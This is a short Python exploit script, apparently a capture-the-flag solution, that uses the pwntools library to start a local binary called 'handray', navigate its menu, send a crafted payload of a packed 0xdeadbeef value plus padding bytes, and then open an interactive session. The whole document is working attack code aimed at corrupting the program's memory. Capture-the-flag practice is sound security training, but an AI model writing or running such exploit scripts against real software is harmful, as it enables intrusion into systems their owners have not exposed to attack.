from pwn import *

context.binary = './handray'
context.log_level = 'info'

p = process(context.binary.path)

p.recvuntil(b'> ')
p.send(b'1\n')

payload = p64(0xdeadbeef) + b'A' * (0x17 - 8)
p.send(payload)

p.recvuntil(b'> ')
p.send(b'3\n')

p.interactive()
